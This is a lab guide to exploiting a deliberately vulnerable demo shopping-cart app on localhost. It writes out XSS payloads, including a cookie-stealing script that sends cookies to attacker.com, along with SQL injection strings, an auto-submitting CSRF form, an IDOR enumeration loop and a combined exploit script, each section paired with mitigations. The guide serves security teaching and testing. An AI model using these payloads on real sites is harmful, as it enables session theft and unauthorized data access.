# Vulnerability Exploitation Guide

This document provides detailed instructions for exploiting each vulnerability in the application.

⚠️ **WARNING**: These exploits are for educational and testing purposes only. Only use on systems you own or have permission to test.

## Prerequisites

- Application running on http://localhost:9000
- `curl` command-line tool

Start the server:
```bash
./gradlew run
```

---

## Vulnerability 1: Reflected XSS (Cross-Site Scripting)

### Endpoint
`GET /greet?name=<input>`

### Description
The application reflects user input directly into the HTML response without any sanitization or encoding. This allows attackers to inject arbitrary HTML and JavaScript code.

### Impact
- Cookie theft
- Session hijacking
- Defacement
- Phishing attacks
- Keylogging

### Exploitation

#### Basic XSS with script tag:
```bash
curl "http://localhost:9000/greet?name=<script>alert('XSS')</script>"
```

**Expected Result**: The response contains the unescaped `<script>` tag:
```html
<h1>Hello, <script>alert('XSS')</script>!</h1>
```

#### Event handler injection:
```bash
curl "http://localhost:9000/greet?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E"
```

**Expected Result**: The response contains the unescaped `<img>` tag with `onerror` handler.

#### Cookie stealing payload:
```bash
curl "http://localhost:9000/greet?name=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E"
```

#### DOM manipulation:
```bash
curl "http://localhost:9000/greet?name=%3Cscript%3Edocument.body.innerHTML%3D%27HACKED%27%3C%2Fscript%3E"
```

### Mitigation
- HTML encode all user input before rendering
- Use Content Security Policy (CSP) headers
- Implement proper output encoding

---

## Vulnerability 2: SQL Injection (Simulated)

### Endpoint
`GET /search?q=<query>`

### Description
The search query is concatenated directly into a SQL-like query string without parameterization. In this simulation, queries containing `' OR '` or `1=1` return all products.

### Impact
- Unauthorized data access
- Data exfiltration
- Authentication bypass
- Database modification/deletion

### Exploitation

#### Basic OR-based injection:
```bash
curl "http://localhost:9000/search?q=laptop'%20OR%20'1'='1"
```

**Expected Result**: Returns all 4 products instead of just those matching "laptop":
```html
<ul>
  <li>Laptop - $999.99</li>
  <li>Mouse - $29.99</li>
  <li>Keyboard - $79.99</li>
  <li>Monitor - $299.99</li>
</ul>
```

#### Alternative payload:
```bash
curl "http://localhost:9000/search?q='%20OR%201=1%20--"
```

#### Union-based injection (simulated):
```bash
curl "http://localhost:9000/search?q=laptop'%20UNION%20SELECT%20*%20FROM%20users--"
```

### Verification
Compare the results:

**Normal search** (returns 1 product):
```bash
curl "http://localhost:9000/search?q=laptop"
```

**Injection** (returns all 4 products):
```bash
curl "http://localhost:9000/search?q=laptop'%20OR%20'1'='1"
```

### Mitigation
- Use parameterized queries/prepared statements
- Implement input validation and sanitization
- Apply principle of least privilege to database accounts
- Use ORM frameworks properly

---

## Vulnerability 3: CSRF (Cross-Site Request Forgery)

### Endpoint
`POST /cart/add?user=<user>&product=<id>`

### Description
The application allows state-changing operations without any CSRF token validation. Attackers can forge requests to add items to any user's cart.

### Impact
- Unauthorized actions on behalf of users
- Shopping cart manipulation
- Unwanted purchases
- Account manipulation

### Exploitation

#### Add item to victim's cart:
```bash
curl -X POST "http://localhost:9000/cart/add?user=victim&product=1"
```

**Expected Result**: Item is successfully added without any token validation.

#### Verify the attack worked:
```bash
curl "http://localhost:9000/cart?user=victim"
```

#### HTML form for CSRF attack:
Save as `csrf_attack.html`:
```html
<html>
<body onload="document.forms[0].submit()">
  <form action="http://localhost:9000/cart/add" method="POST">
    <input type="hidden" name="user" value="victim" />
    <input type="hidden" name="product" value="1" />
  </form>
</body>
</html>
```

Open this file in a browser while the victim is logged in - it will automatically add items to their cart.

#### Multiple items:
```bash
# Add multiple expensive items to victim's cart
curl -X POST "http://localhost:9000/cart/add?user=victim&product=1"  # Laptop $999.99
curl -X POST "http://localhost:9000/cart/add?user=victim&product=4"  # Monitor $299.99
curl -X POST "http://localhost:9000/cart/add?user=victim&product=1"  # Another Laptop $999.99
```

### Mitigation
- Implement CSRF tokens (synchronizer token pattern)
- Validate origin and referer headers
- Use SameSite cookie attribute
- Re-authenticate for sensitive operations

---

## Vulnerability 4: IDOR (Insecure Direct Object Reference)

### Endpoint
`GET /cart?user=<username>`

### Description
The application allows any user to view any other user's cart by simply changing the `user` parameter. There is no authentication or authorization check.

### Impact
- Unauthorized data access
- Privacy violation
- Information disclosure
- Horizontal privilege escalation

### Exploitation

#### Setup - Create test carts:
```bash
# Add items to different users' carts
curl -X POST "http://localhost:9000/cart/add?user=alice&product=1"
curl -X POST "http://localhost:9000/cart/add?user=bob&product=2"
curl -X POST "http://localhost:9000/cart/add?user=admin&product=4"
```

#### Access Alice's cart:
```bash
curl "http://localhost:9000/cart?user=alice"
```

**Expected Result**: Successfully views Alice's cart contents without authentication.

#### Access Bob's cart:
```bash
curl "http://localhost:9000/cart?user=bob"
```

#### Access Admin's cart:
```bash
curl "http://localhost:9000/cart?user=admin"
```

#### Enumerate users:
```bash
# Try common usernames
for user in admin root user alice bob charlie; do
  echo "Checking cart for: $user"
  curl -s "http://localhost:9000/cart?user=$user" | grep "Shopping Cart"
done
```

### Mitigation
- Implement proper authentication
- Verify user authorization before accessing resources
- Use indirect references (UUIDs instead of usernames)
- Implement access control checks
- Log and monitor access attempts

---

## Additional Feature: Widget Endpoint (Jsoup Demo)

### Endpoint
`GET /header-widget`

### Description
This endpoint returns an HTML fragment containing a shopping cart widget. It demonstrates the use of jsoup for HTML parsing in the `DemoShoppingCartClient` class.

### Usage

#### Fetch widget HTML:
```bash
curl "http://localhost:9000/header-widget"
```

**Expected Result**:
```html
<div class="header-widget">
    <div class="cart-icon-link">
        <a href="/cart?user=guest">
            <img src="/cart-icon.png" alt="Cart" />
            <span class="cart-count">0</span>
        </a>
    </div>
</div>
```

#### Test with DemoShoppingCartClient:
The application includes a client that uses jsoup to parse this endpoint:

```kotlin
val client = DemoShoppingCartClient(httpHandler)
val cartWidget = client.fetchCartWidget()
// Returns the HTML content of the div.cart-icon-link element
```

---

## Complete Exploitation Script

Save as `exploit_all.sh`:

```bash
#!/bin/bash

echo "=== Exploiting All Vulnerabilities ==="
echo ""

# 1. XSS
echo "[1] XSS Exploitation"
curl -s "http://localhost:9000/greet?name=<script>alert('Hacked')</script>" | grep -o '<script>'
echo ""

# 2. SQL Injection
echo "[2] SQL Injection"
product_count=$(curl -s "http://localhost:9000/search?q=laptop'%20OR%20'1'='1" | grep -c "<li>")
echo "Products returned: $product_count"
echo ""

# 3. CSRF
echo "[3] CSRF Attack"
curl -s -X POST "http://localhost:9000/cart/add?user=victim&product=1"
curl -s "http://localhost:9000/cart?user=victim" | grep "Laptop"
echo ""

# 4. IDOR
echo "[4] IDOR Attack"
curl -s -X POST "http://localhost:9000/cart/add?user=admin&product=4"
curl -s "http://localhost:9000/cart?user=admin" | grep "Shopping Cart for: admin"
echo ""

echo "=== All exploits executed ==="
```

Run it:
```bash
chmod +x exploit_all.sh
./exploit_all.sh
```

---

## Testing Results Summary

All vulnerabilities have been verified as exploitable:

| Vulnerability | Status | Severity |
|---------------|--------|----------|
| XSS           | ✅ Exploitable | High |
| SQL Injection | ✅ Exploitable | Critical |
| CSRF          | ✅ Exploitable | Medium |
| IDOR          | ✅ Exploitable | High |

---

## Security Testing Tools

These vulnerabilities can also be detected by:

- **OWASP ZAP**: Web application security scanner
- **Burp Suite**: Web vulnerability scanner
- **sqlmap**: Automated SQL injection tool
- **XSStrike**: XSS detection and exploitation tool
- **CodeQL**: Static analysis security testing

---

## Legal Notice

This application is designed for educational and security testing purposes only. Always ensure you have proper authorization before testing any system for security vulnerabilities. Unauthorized access to computer systems is illegal under various laws including the Computer Fraud and Abuse Act (CFAA) in the United States.
